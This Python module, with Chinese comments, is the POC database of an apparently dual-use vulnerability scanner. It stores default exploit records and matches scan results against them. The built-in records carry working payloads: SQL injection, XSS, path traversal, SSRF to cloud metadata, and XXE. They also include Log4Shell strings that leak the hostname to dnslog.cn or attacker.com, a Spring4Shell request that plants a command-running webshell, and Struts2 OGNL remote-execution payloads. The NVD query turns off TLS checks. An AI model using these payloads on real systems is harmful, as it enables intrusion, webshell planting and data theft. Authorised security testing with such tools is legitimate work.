# ```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
漏洞数据库模块 - 本地POC管理 + 在线CVE比对

功能:
    1. 本地漏洞库: JSON格式存储，支持增删查改、导入导出
    2. 自定义POC: 用户可添加自己的POC模板
    3. 实时比对引擎: 扫描结果自动与本地/在线库匹配
    4. 在线查询: 调用 NVD / CVE API 实时获取最新漏洞信息

使用方法:
    db = VulnDatabase()
    db.add_poc(poc_data)           # 添加自定义POC
    results = db.match("SQL注入")   # 本地比对
    cve_info = db.query_cve_online("CVE-2021-44228")  # 在线查询
"""

import os
import json
import time
import hashlib
import threading
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)


# ===== 数据库文件路径 =====
DB_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'data')
DB_FILE = os.path.join(DB_DIR, 'vuln_database.json')
CUSTOM_POC_DIR = os.path.join(DB_DIR, 'custom_pocs')


class VulnDatabase:
    """
    漏洞数据库管理器
    
    支持操作:
        - 本地POC库的CRUD（增删查改）
        - 扫描结果与本地库实时比对
        - 在线CVE/NVD API查询
        - 自定义POC导入导出
    """
    
    def __init__(self, db_file=None):
        """
        初始化数据库
        
        参数:
            db_file: 自定义数据库路径 (str, 可选)
        """
        self.db_file = db_file or DB_FILE
        self.data = {
            'version': '1.0',
            'last_updated': None,
            'categories': {},
            'pocs': [],
            'custom_pocs': [],
            'cve_cache': {}
        }
        self._lock = threading.Lock()
        
        # 确保目录存在
        os.makedirs(DB_DIR, exist_ok=True)
        os.makedirs(CUSTOM_POC_DIR, exist_ok=True)
        
        # 加载或初始化数据库
        self._load_or_init()
    
    # ==================== 数据库基础操作 ====================
    
    def _load_or_init(self):
        """加载数据库文件，不存在则创建默认库"""
        if os.path.exists(self.db_file):
            try:
                with open(self.db_file, 'r', encoding='utf-8') as f:
                    self.data = json.load(f)
                print(f"{Fore.GREEN}[+] 已加载本地漏洞库: {len(self.data.get('pocs', []))} 条内置POC + {len(self.data.get('custom_pocs', []))} 条自定义POC{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] 数据库加载失败，使用默认库: {e}{Style.RESET_ALL}")
                self._create_default_db()
        else:
            print(f"{Fore.CYAN}[*] 首次运行，创建默认漏洞库...{Style.RESET_ALL}")
            self._create_default_db()
    
    def _create_default_db(self):
        """创建默认漏洞数据库（内置常见POC）"""
        self.data = self._get_default_pocs()
        self._save()
    
    def _save(self):
        """保存数据库到文件"""
        self.data['last_updated'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(self.db_file, 'w', encoding='utf-8') as f:
            json.dump(self.data, f, ensure_ascii=False, indent=2)
    
    # ==================== 内置默认POC库 ====================
    
    @staticmethod
    def _get_default_pocs():
        """返回内置的默认POC数据"""
        return {
            'version': '1.0',
            'last_updated': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'categories': {
                'sqli': {'name': 'SQL注入', 'severity': 'High'},
                'xss': {'name': 'XSS跨站脚本', 'severity': 'Medium'},
                'lfi': {'name': '本地文件包含/目录遍历', 'severity': 'High'},
                'rce': {'name': '远程代码执行', 'severity': 'Critical'},
                'ssrf': {'name': '服务端请求伪造', 'severity': 'High'},
                'unauth': {'name': '未授权访问', 'severity': 'High'},
                'info_leak': {'name': '信息泄露', 'severity': 'Medium/Low'},
                'xxe': {'name': 'XML外部实体注入', 'severity': 'High'},
                'deser': {'name': '反序列化漏洞', 'severity': 'Critical'}
            },
            'pocs': [
                # ===== SQL注入类 =====
                {
                    'id': 'POC-SQLI-001',
                    'name': 'MySQL报错注入',
                    'category': 'sqli',
                    'cve_id': '',
                    'description': '通过构造错误SQL语句触发数据库报错，从错误信息中提取敏感数据',
                    'severity': 'High',
                    'payloads': ["' OR 1=1--", "' OR '1'='1", "1' AND 1=CONVERT(int,(SELECT @@version))--", "' UNION SELECT NULL--"],
                    'match_patterns': ['sql syntax', 'mysql', 'ORA-', 'SQLite', 'PostgreSQL', 'microsoft sql'],
                    'detection_method': 'error_based',
                    'affected_components': ['MySQL', 'MariaDB', 'MSSQL', 'PostgreSQL', 'SQLite'],
                    'references': ['https://portswigger.net/web-security/sql-injection'],
                    'created_at': '2026-01-01'
                },
                {
                    'id': 'POC-SQLI-002',
                    'name': 'MySQL时间盲注',
                    'category': 'sqli',
                    'cve_id': '',
                    'description': '通过SLEEP()函数延时判断SQL语句是否执行成功',
                    'severity': 'High',
                    'payloads': ["' AND SLEEP(5)--", "' AND BENCHMARK(5000000,SHA1('test'))--", "1; WAITFOR DELAY '0:0:5'--"],
                    'match_patterns': [],
                    'detection_method': 'time_based',
                    'affected_components': ['MySQL', 'MSSQL'],
                    'references': ['https://portswigger.net/web-security/sql-injection/blind'],
                    'created_at': '2026-01-01'
                },
                # ===== XSS类 =====
                {
                    'id': 'POC-XSS-001',
                    'name': '反射型XSS',
                    'category': 'xss',
                    'cve_id': '',
                    'description': '将恶意JavaScript代码注入到页面参数中，当受害者访问时执行',
                    'severity': 'Medium',
                    'payloads': ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', 'javascript:alert(1)'],
                    'match_patterns': ['<script', 'onerror=', 'onload=', 'javascript:', 'alert\\('],
                    'detection_method': 'reflection_check',
                    'affected_components': ['所有Web应用'],
                    'references': ['https://portswigger.net/web-security/cross-site-scripting'],
                    'created_at': '2026-01-01'
                },
                {
                    'id': 'POC-XSS-002',
                    'name': 'DOM型XSS',
                    'category': 'xss',
                    'cve_id': '',
                    'description': '利用不安全的DOM操作（如innerHTML、document.write等）执行恶意脚本',
                    'severity': 'Medium',
                    'payloads': ['#<img src=x onerror=alert(1)>', '#"><script>alert(1)</script>', "';alert(1)//"],
                    'match_patterns': [],
                    'detection_method': 'dom_analysis',
                    'affected_components': ['所有Web应用'],
                    'references': ['https://portswigger.net/web-security/cross-site-scripting/dom-based'],
                    'created_at': '2026-01-01'
                },
                # ===== 目录遍历/LFI =====
                {
                    'id': 'POC-LFI-001',
                    'name': '路径穿越/目录遍历',
                    'category': 'lfi',
                    'cve_id': 'CVE-2022-XXXX',
                    'description': '通过../序列访问服务器上预期之外的文件',
                    'severity': 'High',
                    'payloads': ['../../../etc/passwd', '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', '....//....//....//etc/passwd', '%2e%2e%2fetc%2fpasswd'],
                    'match_patterns': ['root:.*:0:0', 'root:x:0:0', '\\[boot loader\\]', '127\\.0\\.0\\.1.*localhost'],
                    'detection_method': 'content_match',
                    'affected_components': ['Linux', 'Windows', 'Apache', 'Nginx', 'IIS'],
                    'references': ['https://portswigger.net/web-security/file-path-traversal'],
                    'created_at': '2026-01-01'
                },
                # ===== SSRF =====
                {
                    'id': 'POC-SSRF-001',
                    'name': 'SSRF内网探测',
                    'category': 'ssrf',
                    'cve_id': '',
                    'description': '利用服务端发起请求的能力探测内网服务或访问云元数据',
                    'severity': 'High',
                    'payloads': ['http://127.0.0.1', 'http://localhost', 'http://169.254.169.254/latest/meta-data/', 'http://metadata.google.internal/'],
                    'match_patterns': ['metadata', 'ami-id', 'instance-id', 'google'],
                    'detection_method': 'response_analysis',
                    'affected_components': ['AWS', 'GCP', 'Azure', '内部网络'],
                    'references': ['https://portswigger.net/web-security/ssrf'],
                    'created_at': '2026-01-01'
                },
                # ===== 未授权访问 =====
                {
                    'id': 'POC-UNAUTH-001',
                    'name': 'Tomcat Manager未授权访问',
                    'category': 'unauth',
                    'cve_id': '',
                    'description': 'Apache Tomcat Manager应用未做权限控制，可被未授权访问',
                    'severity': 'High',
                    'paths': ['/manager/html', '/manager/status', '/host-manager/html'],
                    'match_patterns': ['tomcat web application manager', 'apache tomcat'],
                    'detection_method': 'path_access',
                    'affected_components': ['Apache Tomcat 7.x-9.x'],
                    'references': ['https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=tomcat+manager'],
                    'created_at': '2026-01-01'
                },
                {
                    'id': 'POC-UNAUTH-002',
                    'name': 'Spring Boot Actuator未授权',
                    'category': 'unauth',
                    'cve_id': 'CVE-2022-22965 (Spring4Shell)',
                    'description': 'Spring Boot Actuator端点暴露敏感信息或允许远程代码执行',
                    'severity': 'Critical',
                    'paths': ['/actuator', '/actuator/env', '/actuator/heapdump', '/actuator/mappings', '/trace', '/env'],
                    'match_patterns': ['actuator', '"_links"', '"heapdump"', 'spring'],
                    'detection_method': 'path_access',
                    'affected_components': ['Spring Boot 1.x-2.x'],
                    'references': ['https://spring.io/security/cve-2022-22965'],
                    'created_at': '2026-01-01'
                },
                {
                    'id': 'POC-UNAUTH-003',
                    'name': 'Redis未授权访问',
                    'category': 'unauth',
                    'cve_id': '',
                    'description': 'Redis服务未设置密码认证，可被未授权访问并写入webshell',
                    'severity': 'Critical',
                    'ports': [6379],
                    'match_patterns': ['redis_version', 'no auth'],
                    'detection_method': 'service_banner',
                    'affected_components': ['Redis < 6.0'],
                    'references': ['https://raw.githubusercontent.com/vulhub/vulhub/master/redis/4-unacc/README.zh-cn.md'],
                    'created_at': '2026-01-01'
                },
                {
                    'id': 'POC-UNAUTH-004',
                    'name': 'MongoDB未授权访问',
                    'category': 'unauth',
                    'cve_id': '',
                    'description': 'MongoDB数据库未启用认证机制，可被未授权访问',
                    'severity': 'Critical',
                    'ports': [27017],
                    'match_patterns': ['mongodb', 'version'],
                    'detection_method': 'service_banner',
                    'affected_components': ['MongoDB < 3.x'],
                    'references': [],
                    'created_at': '2026-01-01'
                },
                {
                    'id': 'POC-UNAUTH-005',
                    'name': 'phpMyAdmin未授权登录',
                    'category': 'unauth',
                    'cve_id': '',
                    'description': 'phpMyAdmin面板暴露且可被未授权访问',
                    'severity': 'High',
                    'paths': ['/phpmyadmin/', '/pma/', '/myadmin/'],
                    'match_patterns': ['phpmyadmin', 'pma_', 'welcome to phpmyadmin'],
                    'detection_method': 'path_access',
                    'affected_components': ['phpMyAdmin 4.x-5.x'],
                    'references': [],
                    'created_at': '2026-01-01'
                },
                {
                    'id': 'POC-UNAUTH-006',
                    'name': 'JMX Console未授权访问',
                    'category': 'unauth',
                    'cve_id': '',
                    'description': 'Java JMX控制台未授权访问，可能导致RCE',
                    'severity': 'Critical',
                    'paths': ['/jmx-console/', '/jmx-console/HtmlAdaptor'],
                    'match_patterns': ['jmx-console', 'jboss jmx', 'mbean'],
                    'detection_method': 'path_access',
                    'affected_components': ['JBoss 4.x-5.x'],
                    'references': [],
                    'created_at': '2026-01-01'
                },
                {
                    'id': 'POC-UNAUTH-007',
                    'name': 'Druid监控台未授权',
                    'category': 'unauth',
                    'cve_id': '',
                    'description': 'Alibaba Druid连接池监控页面未授权访问',
                    'severity': 'Medium',
                    'paths': ['/druid/index.html', '/druid/login.html', '/druid/webapp.html'],
                    'match_patterns': ['druid', 'alibaba druid', 'datasource stat'],
                    'detection_method': 'path_access',
                    'affected_components': ['Druid < 1.2.0'],
                    'references': [],
                    'created_at': '2026-01-01'
                },
                {
                    'id': 'POC-UNAUTH-008',
                    'name': 'Swagger UI未授权',
                    'category': 'unauth',
                    'cve_id': '',
                    'description': 'Swagger API文档界面未授权访问，可能泄露接口信息',
                    'severity': 'Low',
                    'paths': ['/swagger-ui.html', '/swagger-resources', '/v2/api-docs', '/api-docs'],
                    'match_patterns': ['swagger', 'api-docs', 'openapi'],
                    'detection_method': 'path_access',
                    'affected_components': ['Spring Boot + Swagger'],
                    'references': [],
                    'created_at': '2026-01-01'
                },
                # ===== 信息泄露 =====
                {
                    'id': 'POC-LEAK-001',
                    'name': 'Git源码泄露',
                    'category': 'info_leak',
                    'cve_id': '',
                    'description': '.git目录未删除，可恢复完整源代码',
                    'severity': 'High',
                    'paths': ['/.git/config', '/.git/HEAD'],
                    'match_patterns': ['gitdir', 'repositoryformatversion'],
                    'detection_method': 'path_access',
                    'affected_components': ['Git仓库部署不当'],
                    'references': [],
                    'created_at': '2026-01-01'
                },
                {
                    'id': 'POC-LEAK-002',
                    'name': 'SVN源码泄露',
                    'category': 'info_leak',
                    'cve_id': '',
                    'description': '.svn隐藏目录未删除，可获取历史版本代码',
                    'severity': 'High',
                    'paths': ['/.svn/entries', '/.svn/wc.db'],
                    'match_patterns': ['svn', 'svn:\\/\\/'],
                    'detection_method': 'path_access',
                    'affected_components': ['SVN部署不当'],
                    'references': [],
                    'created_at': '2026-01-01'
                },
                {
                    'id': 'POC-LEAK-003',
                    'name': '环境变量泄露(.env)',
                    'category': 'info_leak',
                    'cve_id': '',
                    'description': '.env环境变量文件暴露，可能包含数据库密码/API密钥',
                    'severity': 'High',
                    'paths': ['/.env', '/.env.local', '/.env.production'],
                    'match_patterns': ['db_', 'secret', 'password', 'api_key', 'token', 'database_url'],
                    'detection_method': 'path_access',
                    'affected_components': ['Node.js/Django/Laravel项目'],
                    'references': [],
                    'created_at': '2026-01-01'
                },
                {
                    'id': 'POC-LEAK-004',
                    'name': '备份文件泄露',
                    'category': 'info_leak',
                    'cve_id': '',
                    'description': '数据库备份或网站备份文件可被下载',
                    'severity': 'High',
                    'paths': ['/www.zip', '/www.tar.gz', '/backup.sql', '/db.sql', '/web.rar', '/1.sql', '/data.zip'],
                    'match_patterns': [],
                    'detection_method': 'path_access_size',
                    'min_size': 100,
                    'affected_components': ['通用'],
                    'references': [],
                    'created_at': '2026-01-01'
                },
                {
                    'id': 'POC-LEAK-005',
                    'name': 'composer.json泄露',
                    'category': 'info_leak',
                    'cve_id': '',
                    'description': 'PHP composer配置文件暴露，可获知依赖组件版本',
                    'severity': 'Low',
                    'paths': ['/composer.json', '/composer.lock'],
                    'match_patterns': ['require', 'autoload', 'php'],
                    'detection_method': 'path_access',
                    'affected_components': ['PHP Composer项目'],
                    'references': [],
                    'created_at': '2026-01-01'
                },
                # ===== RCE类 =====
                {
                    'id': 'POC-RCE-001',
                    'name': 'Log4j2远程代码执行 (Log4Shell)',
                    'category': 'rce',
                    'cve_id': 'CVE-2021-44228',
                    'description': 'Apache Log4j2 JNDI注入漏洞，可通过LDAP/RMI实现RCE',
                    'severity': 'Critical',
                    'payloads': ['${jndi:ldap://${sys:java.version}.dnslog.cn}', '${jndi:rmi://${env:HOSTNAME}.dnslog.cn/exploit}', '${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com/x}'],
                    'match_patterns': [],
                    'detection_method': 'dns_callback',
                    'affected_components': ['Log4j2 <= 2.14.1'],
                    'references': ['https://logging.apache.org/log4j/2.x/security.html', 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228'],
                    'cvss_score': 10.0,
                    'created_at': '2026-01-01'
                },
                {
                    'id': 'POC-RCE-002',
                    'name': 'Spring4Shell RCE',
                    'category': 'rce',
                    'cve_id': 'CVE-2022-22965',
                    'description': 'Spring Framework参数绑定RCE漏洞',
                    'severity': 'Critical',
                    'payloads': ['class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di'],
                    'match_patterns': [],
                    'detection_method': 'request_manipulation',
                    'affected_components': ['Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19'],
                    'references': ['https://spring.io/security/cve-2022-22965'],
                    'cvss_score': 9.8,
                    'created_at': '2026-01-01'
                },
                {
                    'id': 'POC-RCE-003',
                    'name': 'Struts2 S2-045/S2-046 RCE',
                    'category': 'rce',
                    'cve_id': 'CVE-2017-5638',
                    'description': 'Apache Struts2基于Jakarta插件RCE漏洞',
                    'severity': 'Critical',
                    'payloads': ['%{(#test=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)).(#cmd=\'id\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')).(#cmds=(#iswin?{\'cmd\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush()))}', '%{(#nikto=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)).(#cmd=\'echo struts2_security_check\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')).(#cmds=(#iswin?{\'cmd\',\'/c\',#cmd}:{\'/bin/sh\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}'],
                    'match_patterns': ['struts2_security_check'],
                    'detection_method': 'response_content',
                    'affected_components': ['Apache Struts 2.3.5-2.3.31, 2.5-2.5.10'],
                    'references': ['https://cwiki.apache.org/confluence/display/WW/S2-045'],
                    'cvss_score': 10.0,
                    'created_at': '2026-01-01'
                },
                # ===== XXE =====
                {
                    'id': 'POC-XXE-001',
                    'name': 'XML外部实体注入(XXE)',
                    'category': 'xxe',
                    'cve_id': '',
                    'description': '通过XML解析器的外部实体引用读取本地文件或发起SSRF攻击',
                    'severity': 'High',
                    'payloads': ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]><foo>&xxe;</foo>'],
                    'match_patterns': ['root:.*:0:0', 'root:x:0:0'],
                    'detection_method': 'response_content',
                    'affected_components': ['旧版Java XML解析器', 'PHP xml_parse', 'Python lxml'],
                    'references': ['https://portswigger.net/web-security/xxe'],
                    'created_at': '2026-01-01'
                },
                # ===== 反序列化 =====
                {
                    'id': 'POC-DSER-001',
                    'name': 'Java反序列化 (CommonsCollections)',
                    'category': 'deser',
                    'cve_id': 'CVE-2015-4852',
                    'description': 'Apache Commons Collections反序列化导致远程代码执行',
                    'severity': 'Critical',
                    'payloads': ['(Java serialized payload with CommonsCollections gadget)'],
                    'match_patterns': [],
                    'detection_method': 'serialization_probe',
                    'affected_components': ['Apache Commons Collections <= 3.2.1', 'WebLogic', 'JBoss', 'WebSphere'],
                    'references': ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4852'],
                    'cvss_score': 10.0,
                    'created_at': '2026-01-01'
                },
            ],
            'custom_pocs': [],
            'cve_cache': {}
        }
    
    # ==================== POC管理：增删查 ====================
    
    def add_custom_poc(self, poc_data):
        """
        添加自定义POC
        
        参数:
            poc_data: dict, 必须包含以下字段:
                - name: POC名称
                - category: 类别 (sqli/xss/lfi/rce/ssrf/unauth/info_leak/xxe/deser)
                - description: 描述
                - severity: 严重程度 (Critical/High/Medium/Low)
                
                可选字段:
                - payloads: Payload列表
                - paths: 检测路径列表
                - ports: 检测端口列表
                - match_patterns: 匹配模式
                - detection_method: 检测方法
                - affected_components: 影响组件
                - references: 参考链接
                - cve_id: CVE编号
                
        返回:
            str: 新POC的ID
        """
        poc_id = f"POC-CUSTOM-{len(self.data['custom_pocs']) + 1:03d}-{int(time.time())}"
        
        required_fields = ['name', 'category', 'description', 'severity']
        for field in required_fields:
            if field not in poc_data:
                poc_data[field] = ''
        
        poc_data['id'] = poc_id
        poc_data['created_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        poc_data.setdefault('payloads', [])
        poc_data.setdefault('paths', [])
        poc_data.setdefault('ports', [])
        poc_data.setdefault('match_patterns', [])
        poc_data.setdefault('detection_method', 'manual')
        poc_data.setdefault('affected_components', [])
        poc_data.setdefault('references', [])
        poc_data.setdefault('cve_id', '')
        
        with self._lock:
            self.data['custom_pocs'].append(poc_data)
            self._save()
        
        print(f"{Fore.GREEN}[+] 自定义POC已添加: {poc_id} - {poc_data['name']}{Style.RESET_ALL}")
        return poc_id
    
    def delete_custom_poc(self, poc_id):
        """
        删除自定义POC
        
        参数:
            poc_id: POC ID
            
        返回:
            bool: 是否成功删除
        """
        with self._lock:
            original_len = len(self.data['custom_pocs'])
            self.data['custom_pocs'] = [
                p for p in self.data['custom_pocs'] if p.get('id') != poc_id
            ]
            if len(self.data['custom_pocs']) < original_len:
                self._save()
                print(f"{Fore.GREEN}[+] POC已删除: {poc_id}{Style.RESET_ALL}")
                return True
            else:
                print(f"{Fore.RED}[-] 未找到POC: {poc_id}{Style.RESET_ALL}")
                return False
    
    def list_all_pocs(self, category=None, show_details=False):
        """
        列出所有POC
        
        参数:
            category: 按类别过滤 (可选)
            show_details: 是否显示详细信息
            
        返回:
            list: POC列表
        """
        all_pocs = self.data.get('pocs', []) + self.data.get('custom_pocs', [])
        
        if category:
            all_pocs = [p for p in all_pocs if p.get('category') == category]
        
        print(f"\n{'='*70}")
        print(f"  漏洞POC库 - 共 {len(all_pocs)} 条记录")
        if category:
            cat_info = self.data['categories'].get(category, {})
            print(f"  分类: {cat_info.get('name', category)}")
        print(f"{'='*70}\n")
        
        for i, poc in enumerate(all_pocs, 1):
            is_custom = poc.get('id', '').startswith('POC-CUSTOM')
            tag = Fore.YELLOW + '[自定义]' + Style.RESET_ALL if is_custom else Fore.GREEN + '[内置]' + Style.RESET_ALL
            sev = poc.get('severity', 'Unknown')
            
            # 颜色标记严重程度
            sev_color = {
                'Critical': Fore.RED,
                'High': Fore.LIGHTRED_EX,
                'Medium': Fore.YELLOW,
                'Low': Fore.GREEN
            }.get(sev, Fore.WHITE)
            
            print(f"  {i:3d}. {tag} {poc.get('id', '?')}")
            print(f"       名称: {poc.get('name', '?')}")
            print(f"       严重度: {sev_color}{sev}{Style.RESET_ALL} | "
                  f"类别: {poc.get('category', '?')} | "
                  f"CVE: {poc.get('cve_id', '-') or '-'}")
            print(f"       描述: {poc.get('description', '?')[:60]}...")
            
            if show_details:
                if poc.get('payloads'):
                    print(f"       Payloads: {len(poc['payloads'])} 个")
                if poc.get('paths'):
                    print(f"       路径: {', '.join(poc['paths'][:5])}")
                if poc.get('ports'):
                    print(f"       端口: {poc['ports']}")
                if poc.get('references'):
                    print(f"       参考: {poc['references'][0] if poc['references'] else ''}")
            print()
        
        return all_pocs
    
    def search_poc(self, keyword):
        """
        搜索POC（按名称/CVE/描述/组件）
        
        参数:
            keyword: 搜索关键词
            
        返回:
            list: 匹配的POC列表
        """
        keyword_lower = keyword.lower()
        all_pocs = self.data.get('pocs', []) + self.data.get('custom_pocs', [])
        
        results = []
        for poc in all_pocs:
            searchable_fields = [
                poc.get('name', ''),
                poc.get('description', ''),
                poc.get('cve_id', ''),
                ' '.join(poc.get('affected_components', [])),
                ' '.join(poc.get('references', [])),
                poc.get('id', ''),
            ]
            combined_text = ' '.join(searchable_fields).lower()
            if keyword_lower in combined_text:
                results.append(poc)
        
        print(f"\n{Fore.CYAN}[*] 搜索 \"{keyword}\" -> 找到 {len(results)} 条匹配POC:{Style.RESET_ALL}")
        for r in results:
            print(f"  - [{r.get('id','?')}] {r.get('name','?')} ({r.get('severity','?')}) - CVE:{r.get('cve_id','-') or '-'}")
        
        return results
    
    # ==================== 比对引擎 ====================
    
    def match(self, scan_result, mode='local'):
        """
        将扫描结果与漏洞库进行实时比对
        
        参数:
            scan_result: dict, 扫描发现的结果，应包含:
                - type: 漏洞类型 (sqli/xss/lfi/rce/ssrf/unauth/info_leak)
                - url/target: 目标URL或IP
                - detail: 详细信息
                - response_content: 响应内容片段 (可选)
                
            mode: 比对模式
                - 'local': 仅本地库比对
                - 'online': 仅在线查询
                - 'both': 本地+在线双重比对
                
        返回:
            list: 匹配到的POC信息列表
        """
        matches = []
        vuln_type = scan_result.get('type', '').lower()
        target = scan_result.get('target', '') or scan_result.get('url', '')
        detail = scan_result.get('detail', '')
        response_content = scan_result.get('response_content', '')
        
        # === 本地库比对 ===
        if mode in ('local', 'both'):
            local_matches = self._match_local(vuln_type, detail, response_content, target)
            matches.extend(local_matches)
        
        # === 在线CVE查询 ===
        if mode in ('online', 'both'):
            online_matches = self._match_online(vuln_type, detail, target)
            matches.extend(online_matches)
        
        return matches
    
    def _match_local(self, vuln_type, detail, response_content, target):
        """本地库比对逻辑"""
        matches = []
        all_pocs = self.data.get('pocs', []) + self.data.get('custom_pocs', [])
        
        for poc in all_pocs:
            score = 0
            reasons = []
            
            # 1. 类型匹配
            if poc.get('category') == vuln_type:
                score += 40
                reasons.append('类型匹配')
            
            # 2. 内容特征匹配
            if response_content and poc.get('match_patterns'):
                content_lower = response_content.lower()
                for pattern in poc.get('match_patterns', []):
                    if pattern.lower() in content_lower:
                        score += 30
                        reasons.append(f'特征匹配: {pattern}')
                        break
            
            # 3. 组件匹配
            if detail and poc.get('affected_components'):
                detail_lower = detail.lower()
                for comp in poc.get('affected_components', []):
                    if comp.lower() in detail_lower:
                        score += 20
                        reasons.append(f'组件匹配: {comp}')
                        break
            
            # 4. 关键词匹配
            if detail:
                name_keywords = poc.get('name', '').split()
                desc_words = poc.get('description', '').split()[:10]
                keywords = set(name_keywords + desc_words) - {'的', '是', '在', '和', '可', '通过', '等'}
                matched_kw = [kw for kw in keywords if kw.lower() in detail.lower()]
                if matched_kw:
                    score += min(len(matched_kw) * 5, 15)
                    reasons.append(f'关键词匹配: {matched_kw[0]}')
            
            # 匹配阈值 >= 40 视为命中
            if score >= 40:
                match_info = {
                    **poc,
                    'match_score': score,
                    'match_reasons': reasons,
                    'match_mode': 'local',
                    'matched_target': target
                }
                matches.append(match_info)
        
        # 按分数排序
        matches.sort(key=lambda x: x['match_score'], reverse=True)
        return matches
    
    # ==================== 在线CVE查询 ====================
    
    def query_cve_online(self, cve_id=None, keyword=None, limit=10):
        """
        在线查询CVE漏洞信息
        
        数据源:
            - NVD API (https://services.nvd.nist.gov/rest/json/cves/2.0)
            - CVE.org API (https://cveawg.mitre.org/api/)
            
        参数:
            cve_id: CVE编号 (如 CVE-2021-44228)
            keyword: 搜索关键词 (如 log4j)
            limit: 返回结果数量上限
            
        返回:
            list: CVE信息列表
        """
        import requests
        
        results = []
        
        try:
            if cve_id:
                url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id.upper()}"
            elif keyword:
                url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={keyword}&resultsPerPage={limit}"
            else:
                print(f"{Fore.YELLOW}[!] 请提供 CVE_ID 或关键词{Style.RESET_ALL}")
                return results
            
            headers = {
                'User-Agent': 'Myscanner/1.0 (Security Research Tool)',
                'Accept': 'application/json'
            }
            
            resp = requests.get(url, headers=headers, timeout=15, verify=False)
            
            if resp.status_code == 200:
                data = resp.json()
                vulnerabilities = data.get('vulnerabilities', [])
                
                for vuln in vulnerabilities[:limit]:
                    cve = vuln.get('cve', {})
                    cve_id_full = cve.get('id', '')
                    
                    # 提取描述
                    descriptions = cve.get('descriptions', [])
                    desc = next(
                        (d['value'] for d in descriptions if d.get('lang') == 'en'),
                        descriptions[0]['value'] if descriptions else 'No description'
                    )
                    
                    # 提取CVSS评分
                    metrics = cve.get('metrics', {})
                    cvss_v31 = metrics.get('cvssMetricV31', [{}])
                    cvss_v30 = metrics.get('cvssMetricV30', [{}])
                    cvss_data = (cvss_v31 or cvss_v30 or [{}])[0].get('cvssData', {})
                    cvss_score = cvss_data.get('baseScore', 0)
                    severity = cvss_data.get('baseSeverity', 'UNKNOWN')
                    
                    # 提取影响产品
                    affected = []
                    for app in cve.get('applications', []) or []:
                        for platform in app.get('platforms', []):
                            affected.append(platform)
                    
                    result = {
                        'cve_id': cve_id_full,
                        'description': desc[:200],
                        'cvss_score': float(cvss_score),
                        'severity': severity,
                        'published_date': cve.get('published', ''),
                        'last_modified': cve.get('lastModified', ''),
                        'affected_products': affected[:5],
                        'references': [r.get('url', '') for r in cve.get('references', [])][:3],
                        'source': 'NVD',
                        'match_mode': 'online'
                    }
                    results.append(result)
                    
                    # 缓存到本地
                    self.data['cve_cache'][cve_id_full] = result
                
                self._save()
                
                # 打印结果
                print(f"\n{Fore.CYAN}[*] 在线CVE查询完成 - 找到 {len(results)} 条记录:{Style.RESET_ALL}")
                for r in results:
                    sev_color = {
                        'CRITICAL': Fore.RED, 'HIGH': Fore.LIGHTRED_EX,
                        'MEDIUM': Fore.YELLOW, 'LOW': Fore.GREEN
                    }.get(r['severity'].upper(), Fore.WHITE)
                    print(f"  {sev_color}[{r['severity']}]{Style.RESET_ALL} "
                          f"{r['cve_id']} | CVSS:{r['cvss_score']:.1f} | {r['description'][:50]}...")
                
            elif resp.status_code == 403:
                print(f"{Fore.YELLOW}[!] NVD API请求频率限制，请稍后重试{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[!] 在线查询失败 (HTTP {resp.status_code}){Style.RESET_ALL}")
                
        except requests.exceptions.Timeout:
